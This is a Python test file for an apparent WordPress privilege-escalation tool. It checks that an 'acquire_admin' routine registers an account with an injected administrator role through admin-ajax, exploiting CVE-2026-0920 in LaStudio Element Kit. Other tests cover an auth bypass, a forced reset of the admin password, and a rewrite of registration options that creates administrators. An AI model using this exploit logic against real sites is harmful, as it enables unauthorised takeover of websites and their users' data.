from unittest.mock import MagicMock
import wp_recipes
import wp_privesc


def _recipe():
    return wp_recipes.find_privesc("lastudio-element-kit")[0]


def test_privesc_recipe_present():
    r = _recipe()
    assert r["cve"] == "CVE-2026-0920"
    assert r["role_param"] == "lakit_bkrole"
    assert r["role_value"] == "administrator"
    assert r["affected"] == "<=1.5.6.3"


def test_acquire_admin_sends_role_injection():
    http = MagicMock()
    http.post.return_value = MagicMock(status_code=200, text="ok")
    out = wp_privesc.acquire_admin("https://t/", http, _recipe(),
                                   creds={"username": "svc_x", "email": "x@y.z", "password": "pw123"})
    # returns the creds it tried to create
    assert out == {"username": "svc_x", "password": "pw123"}
    # posted to admin-ajax with the malicious role param
    url, = http.post.call_args[0]
    assert url == "https://t/wp-admin/admin-ajax.php"
    data = http.post.call_args[1]["data"]
    assert data["lakit_bkrole"] == "administrator"
    assert data["action"] == "lastudio_register"
    assert data["user_login"] == "svc_x"


def test_acquire_admin_random_creds_are_unique():
    http = MagicMock(); http.post.return_value = MagicMock(status_code=200)
    a = wp_privesc.acquire_admin("https://t", http, _recipe())
    b = wp_privesc.acquire_admin("https://t", http, _recipe())
    assert a["username"] != b["username"]
    assert a["password"] != b["password"]


def test_acquire_admin_swallows_transport_error():
    http = MagicMock(); http.post.side_effect = Exception("boom")
    assert wp_privesc.acquire_admin("https://t", http, _recipe()) is None


# ── generalized precursor kinds ───────────────────────────────────────────────
def test_kind_auth_bypass_returns_authed_session():
    http = MagicMock()
    r = {"kind": "auth-bypass", "endpoint": "/wp-admin/?loginas=1", "method": "GET",
         "params": {"uid": "1"}}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out == {"authed": True}          # session now admin, no creds to return
    http.get.assert_called_once()
    assert http.get.call_args[0][0] == "https://t/wp-admin/?loginas=1"

def test_kind_password_reset_returns_target_and_new_pw():
    http = MagicMock()
    r = {"kind": "password-reset", "endpoint": "/wp-json/x/reset",
         "target_user": "admin", "user_param": "user", "pass_param": "np"}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out["username"] == "admin" and len(out["password"]) > 8
    data = http.post.call_args[1]["data"]
    assert data["user"] == "admin" and data["np"] == out["password"]

def test_kind_options_update_sets_options_then_registers():
    http = MagicMock()
    r = {"kind": "options-update", "endpoint": "/wp-json/x/opt",
         "option_name_param": "key", "option_value_param": "val",
         "set_options": {"users_can_register": "1", "default_role": "administrator"}}
    out = wp_privesc.acquire_admin("https://t", http, r,
                                   creds={"username": "u1", "email": "u1@x.z", "password": "pw"})
    assert out == {"username": "u1", "password": "pw"}
    # two option writes + one registration = 3 POSTs
    assert http.post.call_count == 3
    writes = [c.kwargs["data"] for c in http.post.call_args_list[:2]]
    assert {"users_can_register", "default_role"} == {w["key"] for w in writes}

def test_unknown_kind_returns_none():
    assert wp_privesc.acquire_admin("https://t", MagicMock(), {"kind": "nope"}) is None
